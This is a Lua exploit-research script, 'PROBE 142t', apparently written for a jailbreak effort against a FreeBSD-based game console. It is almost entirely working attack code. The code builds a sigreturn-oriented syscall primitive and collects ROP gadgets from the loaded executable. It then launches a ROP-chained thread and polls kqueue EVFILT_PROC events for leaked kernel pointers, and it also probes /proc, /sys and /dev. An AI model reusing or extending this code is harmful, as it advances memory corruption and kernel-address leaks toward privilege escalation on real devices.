-- CRASH_CLASS: LOW
-- PROBE 142t: kqueue EVFILT_PROC on thread exit + /proc probe + directory scan
--
-- Theory: kevent data/udata fields for EVFILT_PROC on thread exit might
-- contain kernel pointers. Also fix dirent parsing and probe /proc.

print("=== PROBE 142t: KEVENT THREAD ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Eboot gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))

--------------------------------------------------------------------
-- [A] kqueue + EVFILT_PROC on our own PID
-- kqueue(362) → fd
-- kevent(560): FreeBSD 11 kevent has struct kevent:
--   +0x00: ident  (uintptr_t) 8 bytes
--   +0x08: filter (int16)     2 bytes
--   +0x0A: flags  (uint16)    2 bytes
--   +0x0C: fflags (uint32)    4 bytes
--   +0x10: data   (intptr_t)  8 bytes ← potential kernel data!
--   +0x18: udata  (void*)     8 bytes
-- Total: 0x20 = 32 bytes
--
-- EVFILT_PROC = -5
-- EV_ADD = 0x0001
-- NOTE_EXIT = 0x80000000
-- NOTE_FORK = 0x40000000
-- NOTE_EXEC = 0x20000000
-- NOTE_TRACK = 0x00000001
--------------------------------------------------------------------
print("")
print("--- [A] kqueue EVFILT_PROC ---")

-- Create kqueue
local rv_kq = srop(362)
local kqh, kql = get_hi_lo(rv_kq)
print("[A] kqueue ret=" .. hex(rv_kq))

if kql < 256 and kqh == 0 then
    local kq_fd = kql
    print("[A] kqueue fd=" .. kq_fd)

    -- Register EVFILT_PROC for our PID with NOTE_EXIT | NOTE_FORK | NOTE_EXEC | NOTE_TRACK
    local change = gpu + 0x1000
    wq(change + 0x00, uint64(pid))           -- ident = our PID
    wd(change + 0x08, 0x0001FFFB)            -- filter=-5(EVFILT_PROC) | flags=0x0001(EV_ADD)
    -- Actually pack filter(int16) and flags(uint16) separately
    -- filter = -5 = 0xFFFB, flags = 0x0001 (EV_ADD)
    -- In little-endian at +0x08: filter_lo, filter_hi, flags_lo, flags_hi
    -- -5 as int16 = 0xFFFB
    wd(change + 0x08, 0x0001FFFB)  -- flags(16) | filter(16) little-endian
    wd(change + 0x0C, 0xE0000001)  -- fflags: NOTE_EXIT|NOTE_FORK|NOTE_EXEC|NOTE_TRACK
    wq(change + 0x10, uint64(0))   -- data
    wq(change + 0x18, uint64(0x41424344))  -- udata marker

    -- Zero timeout
    local ts_zero = gpu + 0x1100
    wq(ts_zero, uint64(0))
    wq(ts_zero + 8, uint64(0))

    -- Result event
    local event = gpu + 0x1200
    for off = 0, 0x1F, 4 do wd(event + off, 0xEE) end

    -- kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
    -- sys 560 on FreeBSD 11
    local rv_ke = srop(560, uint64(kq_fd), ua(change), uint64(1),
                        ua(event), uint64(1), ua(ts_zero))
    local keh, kel = get_hi_lo(rv_ke)
    print("[A] kevent(register) ret=" .. hex(rv_ke))

    -- Check returned event
    local ev_ident = safe_rq(event)
    local ev_filter_flags = safe_rd(event + 0x08)
    local ev_fflags = safe_rd(event + 0x0C)
    local ev_data = safe_rq(event + 0x10)
    local ev_udata = safe_rq(event + 0x18)

    print("[A] ev.ident=" .. hex(ev_ident))
    print("[A] ev.filter_flags=0x" .. string.format("%08X", ev_filter_flags or 0))
    print("[A] ev.fflags=0x" .. string.format("%08X", ev_fflags or 0))
    print("[A] ev.data=" .. hex(ev_data))
    print("[A] ev.udata=" .. hex(ev_udata))

    -- Check for kernel pointers
    if ev_data then
        local dh, dl = get_hi_lo(ev_data)
        if dh >= 0xFFFF8000 then
            print("[A] *** KERNEL POINTER IN ev.data! ***")
        end
    end

    -- Now create a thread, let it exit, then poll kevent
    print("[A] Creating short-lived thread...")
    local tspec_short = gpu + 0x1300
    wq(tspec_short, uint64(0))
    wq(tspec_short + 8, uint64(100000000))  -- 100ms

    local rop_t = gpu + 0x10000
    local i = 0
    -- nanosleep 100ms then thr_exit(431)
    wq(rop_t + i, g_pop_rdi); i=i+8
    wq(rop_t + i, ua(tspec_short)); i=i+8
    wq(rop_t + i, g_pop_rsi); i=i+8
    wq(rop_t + i, uint64(0)); i=i+8
    wq(rop_t + i, g_pop_rax); i=i+8
    wq(rop_t + i, uint64(240)); i=i+8
    wq(rop_t + i, sc_addr); i=i+8
    -- thr_exit(431) with status=0
    wq(rop_t + i, g_pop_rdi); i=i+8
    wq(rop_t + i, uint64(0)); i=i+8
    wq(rop_t + i, g_pop_rax); i=i+8
    wq(rop_t + i, uint64(431)); i=i+8
    wq(rop_t + i, sc_addr); i=i+8

    local ctx_t = gpu + 0x20000
    for off = 0, 0x4FF, 4 do wd(ctx_t + off, 0) end
    pcall(function() return sc_gc(uint64(ctx_t)) end)
    wq(ctx_t + 0xE0, g_ret)
    wq(ctx_t + 0xF8, ua(rop_t))

    local tid_t = gpu + 0x30000
    wq(tid_t, uint64(0xDEADDEAD))
    pcall(function()
        return sc_thr_create(uint64(ctx_t), uint64(tid_t), uint64(0))
    end)
    local ntid = safe_rq(tid_t)
    local nth, ntl = get_hi_lo(ntid)
    print("[A] thread tid=" .. ntl)

    -- Wait 300ms for thread to exit
    local ts_300 = memory.alloc(16)
    wq(ts_300, uint64(0))
    wq(ts_300 + 8, uint64(300000000))
    pcall(function() sc_nanosleep(uint64(ts_300), uint64(0)) end)

    -- Check if thread is dead
    local rv_tk = srop(433, uint64(ntl), uint64(0))
    print("[A] thr_kill(0)=" .. hex(rv_tk) .. " (non-zero=dead)")

    -- Poll kevent for EVFILT_PROC events
    for off = 0, 0x1F, 4 do wd(event + off, 0xEE) end
    rv_ke = srop(560, uint64(kq_fd), uint64(0), uint64(0),
                 ua(event), uint64(1), ua(ts_zero))
    print("[A] kevent(poll) ret=" .. hex(rv_ke))

    ev_ident = safe_rq(event)
    ev_filter_flags = safe_rd(event + 0x08)
    ev_fflags = safe_rd(event + 0x0C)
    ev_data = safe_rq(event + 0x10)
    ev_udata = safe_rq(event + 0x18)

    if ev_ident then
        local eih, eil = get_hi_lo(ev_ident)
        if eil ~= 0xEEEEEEEE then
            print("[A] EVENT! ident=" .. hex(ev_ident))
            print("[A]  filter_flags=0x" .. string.format("%08X", ev_filter_flags or 0))
            print("[A]  fflags=0x" .. string.format("%08X", ev_fflags or 0))
            print("[A]  data=" .. hex(ev_data))
            print("[A]  udata=" .. hex(ev_udata))
            if ev_data then
                local dh2, dl2 = get_hi_lo(ev_data)
                if dh2 >= 0xFFFF8000 then
                    print("[A] *** KERNEL POINTER IN EVENT DATA! ***")
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- [B] Probe /proc and other directories
--------------------------------------------------------------------
print("")
print("--- [B] Directory probes ---")

local dirs = {"/proc", "/sys", "/tmp"}
for _, dpath in ipairs(dirs) do
    local pbuf = gpu + 0x40000
    for ci = 0, #dpath - 1 do
        local byte = string.byte(dpath, ci + 1)
        local off = ci - (ci % 4)
        local existing = safe_rd(pbuf + off) or 0
        local shift = (ci % 4) * 8
        existing = existing - (math.floor(existing / (2^shift)) % 256) * (2^shift)
        wd(pbuf + off, existing + byte * (2^shift))
    end
    -- null term
    local noff = #dpath
    local nalign = noff - (noff % 4)
    local nshift = (noff % 4) * 8
    local existing = safe_rd(pbuf + nalign) or 0
    existing = existing - (math.floor(existing / (2^nshift)) % 256) * (2^nshift)
    wd(pbuf + nalign, existing)

    local rv_o = srop(5, ua(pbuf), uint64(0))
    local oh, ol = get_hi_lo(rv_o)
    if ol < 256 and oh == 0 then
        print("[B] " .. dpath .. " opened! fd=" .. ol)
        srop(6, uint64(ol))  -- close immediately
    else
        print("[B] " .. dpath .. " FAILED ret=" .. hex(rv_o))
    end
end

--------------------------------------------------------------------
-- [C] Fixed /dev listing with correct dirent format
-- FreeBSD 11 dirent: d_fileno(4), d_reclen(2), d_type(1), d_namlen(1), d_name[]
--------------------------------------------------------------------
print("")
print("--- [C] Fixed /dev listing ---")

-- "/dev\0"
local dp = gpu + 0x41000
wd(dp, 0x7665642F); wd(dp + 4, 0)
local rv_o = srop(5, ua(dp), uint64(0))
local doh, dol = get_hi_lo(rv_o)

if dol < 256 and doh == 0 then
    local dev_fd = dol

    local dbuf = gpu + 0x42000
    for off = 0, 0x7FF, 4 do wd(dbuf + off, 0) end
    local basep = gpu + 0x42800
    wq(basep, uint64(0))

    local rv_gd = srop(196, uint64(dev_fd), ua(dbuf), uint64(0x800), ua(basep))
    local gdh, gdl = get_hi_lo(rv_gd)
    print("[C] getdirentries ret=" .. gdl .. " bytes")

    if gdl > 0 and gdl < 0x800 then
        local pos = 0
        local count = 0
        while pos < gdl and count < 30 do
            -- Try FreeBSD 11 format: ino(4) reclen(2) type(1) namlen(1) name[]
            local w0 = safe_rd(dbuf + pos)      -- d_fileno (4 bytes)
            local w1 = safe_rd(dbuf + pos + 4)  -- reclen(2) + type(1) + namlen(1)
            if not w0 or not w1 then break end

            local ino = w0
            local reclen = w1 % 65536
            local d_type = math.floor(w1 / 65536) % 256
            local d_namlen = math.floor(w1 / 16777216) % 256

            if reclen == 0 or reclen > 512 then break end

            local name = ""
            for ci = 0, math.min(d_namlen - 1, 31) do
                local aligned = pos + 8 + ci - (ci % 4)
                local cb = safe_rd(dbuf + aligned)
                if cb then
                    local shift = (ci % 4) * 8
                    local ch = math.floor(cb / (2^shift)) % 256
                    if ch >= 32 and ch < 127 then
                        name = name .. string.char(ch)
                    end
                end
            end

            if count < 20 then
                print("[C]  " .. name .. " ino=" .. ino .. " type=" .. d_type)
            end
            pos = pos + reclen
            count = count + 1
        end
        print("[C] total entries: " .. count)
    end
    srop(6, uint64(dev_fd))
end

print("")
print("=== DONE ===")
